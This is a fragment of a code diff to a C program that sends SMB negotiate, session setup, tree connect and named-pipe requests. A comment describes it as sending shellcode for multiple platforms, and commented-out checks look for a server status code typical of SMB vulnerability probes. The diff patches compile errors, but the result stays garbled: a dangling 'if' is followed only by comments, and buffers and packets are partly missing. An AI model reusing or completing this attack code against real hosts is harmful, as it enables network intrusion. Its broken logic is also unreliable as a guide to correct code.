@@ -215,9 +215,9 @@ int main(int argc, char** argv)
     }*/
 	// sends executable data asuming it is shell code which means for mac ios windows and linux shellcode specifically for each
 	// type.
-    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate), 0);
+    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
     printf("sending Session_Setup_AndX_Request!\n");
-    send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request), 0);
+    send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
     /**if (ret <= 0)
     {
         printf("send Session_Setup_AndX_Request error!\n");
@@ -246,13 +246,13 @@ int main(int argc, char** argv)
 		
     //send TreeConnect request
     printf("sending TreeConnect Request!\n");
-    send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest), 0);
+    send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
     /**if (ret <= 0)
     {
         printf("send TreeConnect_AndX_Request error!\n");
         return 0;
     }*/
-	char recvbuff[];
+	char recvbuff[1024];
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
     /**
     //copy treeID from recvbuff @ 28, 29
@@ -266,9 +266,9 @@ int main(int argc, char** argv)
 
     //send transNamedPipe request
     **/
-	char enablingStr[];
-	chat confirmationStr[];
-	
+	//char recvbuff[2048];
+char enablingStr[1024] = {0}; // Initialize with zeros
+char confirmationStr[1024] = {0};
     printf("sending transNamedPipeRequest!\n");
     send(sock, (char*)enablingStr, sizeof(enablingStr), 0);
     /**if (ret <= 0)
@@ -277,7 +277,8 @@ int main(int argc, char** argv)
         return 0;
     }*/
     recv(sock, (char*)confirmationStr, sizeof(confirmationStr), 0);
-    if (confirmationStr == "confirmation")
+    if (strcmp(confirmationStr, "confirmation") == 0)
+		// CORRECT
 	/**
     //compare the NT_STATUS response to 0xC0000205 ( STATUS_INSUFF_SERVER_RESOURCES)
     if (recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
